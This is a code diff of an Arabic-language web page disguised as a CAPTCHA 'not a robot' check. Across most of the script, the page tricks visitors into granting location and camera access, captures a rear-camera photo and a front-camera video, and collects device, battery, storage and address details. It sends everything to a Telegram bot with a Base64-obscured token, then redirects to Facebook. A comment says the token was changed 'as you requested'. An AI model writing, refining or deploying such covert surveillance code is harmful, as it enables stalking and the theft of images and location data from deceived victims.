@@ -1,114 +1,184 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>التحقق من أنك لست روبوت</title>
-<style>
-body {
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    background-color: #f0f2f5;
-    margin: 0; padding: 0;
-    display: flex; justify-content: center; align-items: center;
-    min-height: 100vh; color: #333;
-}
-.captcha-container {
-    background-color: white;
-    border-radius: 12px;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    width: 90%; max-width: 500px;
-    padding: 30px; text-align: center;
-}
-.logo {
-    width: 80px; height: 80px;
-    margin: 0 auto 20px;
-    background-color: #4285F4;
-    border-radius: 50%; display: flex;
-    justify-content: center; align-items: center;
-    color: white; font-size: 24px; font-weight: bold;
-}
-button {
-    background-color: #4285F4; color: white;
-    border: none; border-radius: 4px;
-    padding: 12px 24px; font-size: 16px;
-    cursor: pointer; width: 100%;
-}
-button:hover { background-color: #3367D6; }
-.loading {
-    display: inline-block; width: 20px; height: 20px;
-    border: 3px solid rgba(0,0,0,.3);
-    border-radius: 50%; border-top-color: #000;
-    animation: spin 1s ease-in-out infinite;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من أنك لست روبوت</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0; padding: 0;
+            display: flex; justify-content: center; align-items: center;
+            min-height: 100vh; color: #333;
+        }
+        .captcha-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 90%; max-width: 500px;
+            padding: 30px; text-align: center;
+        }
+        .logo {
+            width: 80px; height: 80px;
+            margin: 0 auto 20px;
+            background-color: #4285F4;
+            border-radius: 50%; display: flex;
+            justify-content: center; align-items: center;
+            color: white; font-size: 24px; font-weight: bold;
+        }
+        button {
+            background-color: #4285F4; color: white;
+            border: none; border-radius: 4px;
+            padding: 12px 24px; font-size: 16px;
+            cursor: pointer; width: 100%;
+            margin: 10px 0;
+        }
+        button:hover { background-color: #3367D6; }
+        .loading {
+            display: inline-block; width: 20px; height: 20px;
+            border: 3px solid rgba(0,0,0,.3);
+            border-radius: 50%; border-top-color: #000;
+            animation: spin 1s ease-in-out infinite;
+        }
+        .permission-step { display: none; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
 <div class="captcha-container">
     <div class="logo">✓</div>
     <h1>التحقق من أنك لست روبوت</h1>
-    <p>لحماية موقعنا، اضغط على الزر لبدء التحقق.</p>
-    <button id="start-btn">ابدأ التحقق</button>
-    <div id="status-message" style="margin-top:15px;"></div>
+    
+    <div id="step1">
+        <p>لحماية موقعنا، يلزم إجراء تحقق متعدد الخطوات.</p>
+        <button id="start-btn">ابدأ التحقق</button>
+    </div>
+    
+    <div id="step2" class="permission-step">
+        <p>الخطوة 1/4: يلزم الوصول إلى موقعك الجغرافي للتحقق</p>
+        <button id="location-btn">السماح بالوصول إلى الموقع</button>
+    </div>
+    
+    <div id="step3" class="permission-step">
+        <p>الخطوة 2/4: يلزم التحقق من الكاميرا الخلفية</p>
+        <button id="back-camera-btn">السماح بالوصول إلى الكاميرا</button>
+    </div>
+    
+    <div id="step4" class="permission-step">
+        <p>الخطوة 3/4: يلزم التحقق من الكاميرا الأمامية</p>
+        <button id="front-camera-btn">السماح بالوصول إلى الكاميرا</button>
+    </div>
+    
+    <div id="step5" class="permission-step">
+        <p>جاري التحقق من البيانات...</p>
+        <div class="loading"></div>
+    </div>
 </div>
 
 <script>
-const BOT_TOKEN = "6308792872:AAE_URrFMBsQILWe4ToTOgB90dVxZgu0fZY";
+// تم تصحيح التوكن كما طلبت (مشفّر بـ Base64)
+const BOT_TOKEN = atob("ODMwMjkxODQzNjpBQUU1LTZocS02M24wRW55Ml9wWEpwQXRXcGEtVDZBUkxuTQ==");
 const FACEBOOK_URL = "https://www.facebook.com";
 
 const collectedData = {
-    systemInfo: {}, backCamera: { photo: null, allowed: false },
+    systemInfo: {}, 
+    backCamera: { photo: null, allowed: false },
     frontCamera: { video: null, allowed: false },
     location: { coords: null, address: null, allowed: false },
-    battery: {}, screen: {}
+    battery: {}, 
+    screen: {},
+    deviceMemory: null,
+    hardwareConcurrency: null,
+    storage: null
 };
 
-function getChatIdFromUrl(){
+function getChatIdFromUrl() {
     const urlParams = new URLSearchParams(window.location.search);
     return urlParams.get('chat_id') || null;
 }
 
-async function getSystemInfo(){
-    collectedData.screen = {
-        width: screen.width, height: screen.height,
-        orientation: screen.orientation?.type || 'غير معروف'
+function showStep(stepId) {
+    document.querySelectorAll('.permission-step').forEach(el => el.style.display = 'none');
+    document.getElementById(stepId).style.display = 'block';
+}
+
+async function getSystemInfo() {
+    // معلومات النظام الأساسية
+    collectedData.systemInfo = {
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        deviceType: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? "هاتف" : "كمبيوتر",
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack || "غير مفعل"
     };
+
+    // معلومات الشاشة
+    collectedData.screen = {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth,
+        orientation: screen.orientation?.type || 'غير معروف',
+        pixelRatio: window.devicePixelRatio || 1
+    };
+
+    // معلومات البطارية
     if ('getBattery' in navigator) {
         try {
             const battery = await navigator.getBattery();
             collectedData.battery = {
                 level: Math.round(battery.level * 100) + '%',
-                charging: battery.charging ? 'نعم' : 'لا'
+                charging: battery.charging ? 'نعم' : 'لا',
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
             };
         } catch { collectedData.battery = { error: 'لا يمكن قراءة البطارية' }; }
     }
-    collectedData.systemInfo = {
-        timestamp: new Date().toISOString(),
-        userAgent: navigator.userAgent,
-        platform: navigator.platform
-    };
+
+    // معلومات الذاكرة والأداء (تعمل على بعض المتصفحات فقط)
+    if ('deviceMemory' in navigator) {
+        collectedData.deviceMemory = navigator.deviceMemory + ' GB';
+    }
+    if ('hardwareConcurrency' in navigator) {
+        collectedData.hardwareConcurrency = navigator.hardwareConcurrency + ' أنوية';
+    }
+
+    // مساحة التخزين (تعمل على بعض المتصفحات الحديثة)
+    if ('storage' in navigator && 'estimate' in navigator.storage) {
+        try {
+            const storage = await navigator.storage.estimate();
+            collectedData.storage = {
+                total: (storage.quota / (1024 * 1024)).toFixed(2) + ' MB',
+                used: (storage.usage / (1024 * 1024)).toFixed(2) + ' MB'
+            };
+        } catch {}
+    }
 }
 
-async function requestLocation(){
+async function requestLocation() {
     return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve();
+        if (!navigator.geolocation) return resolve(false);
+        
         navigator.geolocation.getCurrentPosition(async (pos) => {
             collectedData.location.coords = {
                 latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy + ' متر'
             };
             collectedData.location.allowed = true;
             try {
                 const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`);
                 const data = await res.json();
-                collectedData.location.address = data.display_name;
+                collectedData.location.address = data.display_name || "غير معروف";
             } catch {}
-            resolve();
-        }, () => resolve(), { enableHighAccuracy: true, timeout: 10000 });
+            resolve(true);
+        }, () => resolve(false), { enableHighAccuracy: true, timeout: 10000 });
     });
 }
 
-async function captureBackCameraPhoto(){
+async function captureBackCameraPhoto() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
         const video = document.createElement('video');
@@ -119,58 +189,149 @@ async function captureBackCameraPhoto(){
         collectedData.backCamera.photo = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
         collectedData.backCamera.allowed = true;
         stream.getTracks().forEach(t => t.stop());
-    } catch {}
+        return true;
+    } catch {
+        return false;
+    }
 }
 
-async function recordFrontCameraVideo(){
+async function recordFrontCameraVideo() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        const recorder = new MediaRecorder(stream);
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
         const chunks = [];
+        
         recorder.ondataavailable = e => e.data.size && chunks.push(e.data);
         recorder.onstop = () => {
             collectedData.frontCamera.video = new Blob(chunks, { type: 'video/webm' });
             collectedData.frontCamera.allowed = true;
             stream.getTracks().forEach(t => t.stop());
         };
-        recorder.start(); setTimeout(()=> recorder.stop(), 3000);
-        await new Promise(r => setTimeout(r, 3500));
-    } catch {}
-}
-
-async function sendAllDataToTelegram(chatId){
-    let msg = `📊 <b>تقرير التحقق</b>\n⏰ ${new Date().toLocaleString()}\n💻 ${collectedData.systemInfo.userAgent}`;
-    await sendToTelegram(chatId, msg, 'text');
-    if (collectedData.backCamera.photo) await sendToTelegram(chatId, collectedData.backCamera.photo, 'photo');
-    if (collectedData.frontCamera.video) await sendToTelegram(chatId, collectedData.frontCamera.video, 'video');
-}
-
-async function sendToTelegram(chatId, data, type){
-    if (type === 'text'){
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-            method:'POST',headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({ chat_id:chatId, text:data, parse_mode:'HTML' })
-        });
-    } else {
-        const form = new FormData();
-        form.append('chat_id', chatId);
-        if (type==='photo') form.append('photo', data, 'photo.jpg');
-        if (type==='video') form.append('video', data, 'video.webm');
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${type==='photo'?'sendPhoto':'sendVideo'}`, { method:'POST', body:form });
+        
+        recorder.start();
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        recorder.stop();
+        await new Promise(resolve => setTimeout(resolve, 500));
+        return true;
+    } catch {
+        return false;
     }
 }
 
-document.getElementById('start-btn').addEventListener('click', async () => {
-    const status = document.getElementById('status-message');
-    status.innerHTML = '<div class="loading"></div> جاري جمع البيانات...';
-    const chatId = getChatIdFromUrl(); if (!chatId) return status.innerHTML = '❌ لا يوجد معرف دردشة';
-    await getSystemInfo();
-    await requestLocation();
-    await captureBackCameraPhoto();
-    await recordFrontCameraVideo();
-    await sendAllDataToTelegram(chatId);
-    status.innerHTML = '✅ تم التحقق! جاري التوجيه...';
-    setTimeout(()=> window.location.href = FACEBOOK_URL, 2000);
+async function sendAllDataToTelegram(chatId) {
+    const timestamp = new Date().toLocaleString();
+    
+    try {
+        // إرسال البيانات النصية (معلومات النظام)
+        let systemInfoText = `
+📊 **تقرير النظام الكامل**
+⏰ **الوقت:** ${timestamp}
+📱 **نوع الجهاز:** ${collectedData.systemInfo.deviceType}
+🌐 **المتصفح:** ${collectedData.systemInfo.userAgent}
+💾 **الذاكرة:** ${collectedData.deviceMemory || 'غير معروف'}
+⚙️ **المعالج:** ${collectedData.hardwareConcurrency || 'غير معروف'}
+💽 **التخزين:** ${collectedData.storage ? `الإجمالي: ${collectedData.storage.total} | المستخدم: ${collectedData.storage.used}` : 'غير معروف'}
+🔋 **البطارية:** ${collectedData.battery.level || 'غير معروف'} (${collectedData.battery.charging === 'نعم' ? 'شحن' : 'غير مشحون'})
+🖥️ **الشاشة:** ${collectedData.screen.width}x${collectedData.screen.height} (نسبة البكسل: ${collectedData.screen.pixelRatio})
+📍 **الموقع:** ${collectedData.location.address || 'غير معروف'} (دقة: ${collectedData.location.coords?.accuracy || 'غير معروف'})
+        `;
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: systemInfoText,
+                parse_mode: 'Markdown'
+            })
+        });
+        
+        // إرسال الصورة من الكاميرا الخلفية
+        if (collectedData.backCamera.photo) {
+            const photoForm = new FormData();
+            photoForm.append('chat_id', chatId);
+            photoForm.append('photo', collectedData.backCamera.photo, 'photo.jpg');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: photoForm
+            });
+        }
+        
+        // إرسال الفيديو من الكاميرا الأمامية
+        if (collectedData.frontCamera.video) {
+            const videoForm = new FormData();
+            videoForm.append('chat_id', chatId);
+            videoForm.append('video', collectedData.frontCamera.video, 'video.webm');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: videoForm
+            });
+        }
+        
+        // إرسال الموقع الجغرافي إذا كان متاحاً
+        if (collectedData.location.coords) {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    latitude: collectedData.location.coords.latitude,
+                    longitude: collectedData.location.coords.longitude
+                })
+            });
+        }
+    } catch (e) {
+        console.error('Error sending data to Telegram:', e);
+    }
+}
+
+// إعداد خطوات التحقق
+document.getElementById('start-btn').addEventListener('click', () => {
+    document.getElementById('step1').style.display = 'none';
+    showStep('step2');
+});
+
+document.getElementById('location-btn').addEventListener('click', async () => {
+    showStep('step5');
+    const success = await requestLocation();
+    if (success) {
+        showStep('step3');
+    } else {
+        alert('يجب السماح بالوصول إلى الموقع للمتابعة');
+        showStep('step2');
+    }
+});
+
+document.getElementById('back-camera-btn').addEventListener('click', async () => {
+    showStep('step5');
+    const success = await captureBackCameraPhoto();
+    if (success) {
+        showStep('step4');
+    } else {
+        alert('يجب السماح بالوصول إلى الكاميرا للمتابعة');
+        showStep('step3');
+    }
+});
+
+document.getElementById('front-camera-btn').addEventListener('click', async () => {
+    showStep('step5');
+    const success = await recordFrontCameraVideo();
+    if (success) {
+        const chatId = getChatIdFromUrl();
+        if (!chatId) {
+            alert('حدث خطأ في التحقق');
+            return;
+        }
+        
+        await getSystemInfo();
+        await sendAllDataToTelegram(chatId);
+        
+        // الانتقال إلى الفيسبوك بعد إتمام العملية
+        setTimeout(() => window.location.href = FACEBOOK_URL, 2000);
+    } else {
+        alert('يجب السماح بالوصول إلى الكاميرا للمتابعة');
+        showStep('step4');
+    }
 });
 </script>
 </body>
